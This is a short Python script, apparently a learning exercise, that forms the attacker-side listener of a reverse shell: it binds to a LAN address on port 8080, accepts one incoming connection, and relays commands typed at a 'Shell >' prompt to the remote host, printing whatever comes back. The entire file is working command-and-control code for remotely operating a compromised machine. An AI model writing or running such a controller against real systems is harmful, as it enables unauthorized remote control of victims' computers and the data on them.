import socket


def connect():
    print("=" * 50)
    print("[+] Listening for incoming TCp connectionson port 8080")
    mySocket = socket.socket()
    mySocket.bind(("192.168.83.128", 8080)) 
    mySocket.listen(1)
    connection, address = mySocket.accept()

    print("=" * 50)
    print(f"Connected established: {address}")

    while True:
        command = input("Shell > ")

        if "terminate" in command:
            connection.send("terminate".encode())
            connection.close()
            break
        else:
            connection.send(command.encode())
            print(connection.recv(1024).decode())


def main():
    connect()


main()
